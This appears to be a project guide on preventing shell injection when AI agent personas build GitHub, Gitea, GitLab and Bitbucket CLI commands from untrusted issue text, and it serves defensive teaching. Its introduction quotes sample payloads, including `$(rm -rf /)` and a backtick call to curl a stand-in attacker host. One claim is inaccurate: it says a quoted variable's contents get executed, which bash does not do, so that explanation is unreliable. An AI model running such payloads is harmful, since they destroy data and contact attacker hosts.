# Secure CLI Patterns for Persona Prompts

When Wave personas construct CLI commands via Bash tool calls, untrusted content
(issue titles, PR bodies, user comments) can contain shell metacharacters that
trigger unintended command execution. This guide documents safe patterns that
prevent shell injection in persona-generated commands.

## Why Shell Injection Matters

Wave personas build shell commands from data they read at runtime -- GitHub issue
titles, PR descriptions, comment bodies. If a malicious or accidental payload
like `$(rm -rf /)` or `` `curl attacker.com` `` appears in that data and is
interpolated directly into a shell command, the shell executes the embedded
command instead of treating it as literal text.

The Go adapter uses `exec.Command` (no shell), but the AI agent's Bash tool
calls go through a shell interpreter. The attack surface is therefore inside
the commands the persona constructs, not in Wave's own execution path.

## Safe Patterns

### 1. `--body-file` with Temporary Files

Write content to a file first, then reference the file path. The shell never
interprets the content.

```bash
# Write content to a temp file (no shell interpretation)
cat > /tmp/pr-body.md <<'BODY'
## Summary
Fixes the widget rendering issue.

Details with $special characters and `backticks` are safe here.
BODY

# Pass the file path -- content is never parsed by the shell
gh pr create --title "Fix widget rendering" --body-file /tmp/pr-body.md
```

This is the **preferred pattern** for any command that accepts a `--body-file`,
`-F`, or `@file` argument.

### 2. Single-Quoted Heredocs

Use `<<'EOF'` (with the delimiter in single quotes) to prevent all shell
expansion inside the heredoc. This is critical -- an unquoted `<<EOF` expands
variables and command substitutions.

```bash
# SAFE: single-quoted delimiter prevents expansion
gh pr create --title "Fix widget rendering" --body "$(cat <<'EOF'
## Summary
This text is safe: $HOME, $(whoami), and `uname` are all literal.
EOF
)"
```

```bash
# UNSAFE: unquoted delimiter -- shell expands $HOME, $(whoami), `uname`
gh pr create --title "Fix rendering" --body "$(cat <<EOF
Current user: $(whoami)
Home: $HOME
EOF
)"
```

### 3. `gh api` with `-f` Flags

The `gh api` command's `-f` flag passes values as literal strings in JSON,
bypassing the shell entirely.

```bash
# Safe: -f values are JSON-encoded, no shell interpretation
gh api repos/{owner}/{repo}/issues/42/comments \
  -f body="This comment has \$pecial chars and \`backticks\`"
```

For longer content, combine with a file:

```bash
# Write payload to file, then POST it
cat > /tmp/comment.json <<'EOF'
{
  "body": "Analysis complete. See details below.\n\n$HOME is literal here."
}
EOF

gh api repos/{owner}/{repo}/issues/42/comments --input /tmp/comment.json
```

### 4. Bitbucket REST API with `@file` Payloads

For Bitbucket (which uses `curl` instead of a dedicated CLI), write JSON
payloads to a temp file and reference them with `-d @/path/to/file`.

```bash
# Build JSON payload safely in a file
cat > /tmp/payload.json <<'EOF'
{
  "title": "Updated: handle edge cases",
  "description": "Fixes issue with $pecial characters in input"
}
EOF

# POST the file -- curl reads it directly, no shell interpretation
curl -s -X PUT \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${BITBUCKET_TOKEN}" \
  -d @/tmp/payload.json \
  "https://api.bitbucket.org/2.0/repositories/${WORKSPACE}/${REPO}/issues/42"
```

## Unsafe Anti-Patterns

### Inline `--body` with Untrusted Content

```bash
# DANGEROUS: if $ISSUE_BODY contains $(malicious_command), it executes
gh issue edit 42 --body "$ISSUE_BODY"

# DANGEROUS: if the content contains backticks or $(), shell expands them
gh pr create --body "Enhanced description: $(cat analysis.txt)"
```

**Why it is dangerous**: The shell evaluates the string inside double quotes
before passing it to `gh`. Any `$()`, backticks, or `$VARIABLE` references
in the content are executed or expanded.

### Inline `--title` with Variables

```bash
# DANGEROUS: title content may contain shell metacharacters
gh issue edit 42 --title "$NEW_TITLE"
```

**Why it is dangerous**: If `$NEW_TITLE` contains `$(id)` or similar, the
shell executes the embedded command. Use a heredoc or write to a file instead.

### Unquoted Heredoc Delimiters

```bash
# DANGEROUS: without quotes on EOF, shell expands content
gh pr create --body "$(cat <<EOF
User home is $HOME
Running as $(whoami)
EOF
)"
```

**Why it is dangerous**: `<<EOF` (without quotes) tells the shell to perform
variable expansion and command substitution inside the heredoc. Always use
`<<'EOF'` to suppress expansion.

### Backtick Interpolation

```bash
# DANGEROUS: backticks trigger command substitution
gh issue comment 42 --body "Build output: `make build 2>&1`"
```

**Why it is dangerous**: The shell executes the command inside backticks
before the outer command runs. In persona prompts, content from issues or
PRs may contain backticks as markdown formatting (code spans), which would
be interpreted as commands.

## Platform-Specific Examples

### GitHub (`gh`)

```bash
# Create a PR with safe body
cat > /tmp/pr-body.md <<'EOF'
## Changes
- Fixed input validation
- Added error handling for edge cases
EOF
gh pr create --title "Fix input validation" --body-file /tmp/pr-body.md

# Comment on an issue safely
cat > /tmp/comment.md <<'EOF'
Analysis complete. No security issues found.
EOF
gh issue comment 42 --body-file /tmp/comment.md

# Edit an issue body safely
cat > /tmp/issue-body.md <<'EOF'
## Description
Updated description with safe content handling.

## Acceptance Criteria
- [ ] All inputs validated
EOF
gh issue edit 42 --body-file /tmp/issue-body.md
```

### Gitea (`tea`)

```bash
# Create an issue with safe body
cat > /tmp/issue-body.md <<'EOF'
## Description
New feature request with safe content.
EOF
tea issues create --title "Add input validation" --body "$(cat /tmp/issue-body.md)"

# Comment on an issue
cat > /tmp/comment.md <<'EOF'
Review complete. Changes look good.
EOF
tea issues comment 42 --body "$(cat /tmp/comment.md)"
```

### GitLab (`glab`)

```bash
# Create a merge request with safe body
cat > /tmp/mr-body.md <<'EOF'
## Summary
Implements the new validation layer.
EOF
glab mr create --title "Add validation layer" --description "$(cat /tmp/mr-body.md)"

# Comment on an issue
cat > /tmp/comment.md <<'EOF'
Investigation complete. Root cause identified.
EOF
glab issue note 42 --message "$(cat /tmp/comment.md)"
```

### Bitbucket (`curl`)

```bash
# Create a comment via REST API
cat > /tmp/comment.json <<'EOF'
{
  "content": {
    "raw": "Review complete. All checks passed."
  }
}
EOF
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${BITBUCKET_TOKEN}" \
  -d @/tmp/comment.json \
  "https://api.bitbucket.org/2.0/repositories/${WORKSPACE}/${REPO}/issues/42/comments"

# Update an issue
cat > /tmp/update.json <<'EOF'
{
  "title": "Updated title",
  "content": {
    "raw": "Updated description with safe content."
  }
}
EOF
curl -s -X PUT \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${BITBUCKET_TOKEN}" \
  -d @/tmp/update.json \
  "https://api.bitbucket.org/2.0/repositories/${WORKSPACE}/${REPO}/issues/42"
```

## Summary of Rules

| Pattern | Safe | Why |
|---------|------|-----|
| `--body-file /tmp/body.md` | Yes | Shell never interprets file content |
| `<<'EOF' ... EOF` | Yes | Single-quoted delimiter suppresses expansion |
| `gh api -f body="text"` | Yes | Values are JSON-encoded by `gh` |
| `-d @/tmp/payload.json` | Yes | curl reads file directly |
| `--body "$VARIABLE"` | No | Shell expands `$()`, backticks in value |
| `--body "$(cat <<EOF ... EOF)"` | No | Unquoted heredoc expands content |
| `--title "$TITLE"` | No | Same expansion risk as `--body` |

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Bash Reference Manual -- Here Documents](https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Here-Documents)
- [GitHub CLI Manual](https://cli.github.com/manual/)
